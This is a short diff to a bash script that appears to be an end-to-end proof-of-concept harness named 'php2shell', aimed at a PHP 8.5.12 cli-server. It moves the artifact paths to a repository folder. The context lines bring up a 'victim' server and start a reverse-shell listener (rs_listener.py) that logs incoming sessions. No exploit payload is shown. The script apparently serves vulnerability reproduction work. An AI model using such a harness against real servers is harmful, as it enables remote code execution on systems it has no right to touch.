@@ -9,7 +9,8 @@
 # ============================================================================
 set -u
 PHP=${1:-/tmp/php8512_build/plain2/sapi/cli/php}
-ART=/mnt/c/Users/andre/Downloads/php2shell-claude
+REPO=$(cd "$(dirname "$0")" && pwd)
+ART=$REPO/zero1_session_gaps/repro
 ROOT=/tmp/p2s_e2e
 PORT=18260
 LPORT=1360
@@ -59,7 +60,7 @@ echo "[1] victim up: PHP 8.5.12 cli-server, write side php_serialize"
 
 # ---- listener
 rm -f $ROOT/session.log
-python3 $ART/poc_matrix/rs_listener.py $LPORT $ROOT/session.log &
+python3 $ART/rs_listener.py $LPORT $ROOT/session.log &
 LPID=$!; disown
 sleep 1
 echo "[2] listener on :$LPORT"
